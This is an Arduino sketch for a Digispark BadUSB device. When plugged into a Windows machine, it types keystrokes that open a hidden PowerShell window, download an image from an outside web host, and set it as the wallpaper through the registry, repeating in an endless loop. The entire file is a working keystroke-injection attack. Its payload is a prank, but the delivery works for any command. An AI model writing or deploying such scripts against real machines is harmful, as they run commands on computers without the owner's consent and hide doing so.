#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  // Delay for 0 seconds and clear any existing keystrokes
  DigiKeyboard.delay(0);
  DigiKeyboard.sendKeyStroke(0);

  // Open PowerShell and download and set the wallpaper
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(0);
  DigiKeyboard.print("powershell -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(0);
  DigiKeyboard.print("iwr -Uri https://sa-if.github.io/assets/images/slider/banner-01.png -OutFile C:/windows/temp/b.jpg;sp 'HKCU:Control Panel/Desktop' WallPaper 'C:/windows/temp/b.jpg';RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 5");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Turn on the LED for 5 seconds and then turn it off
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(1);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}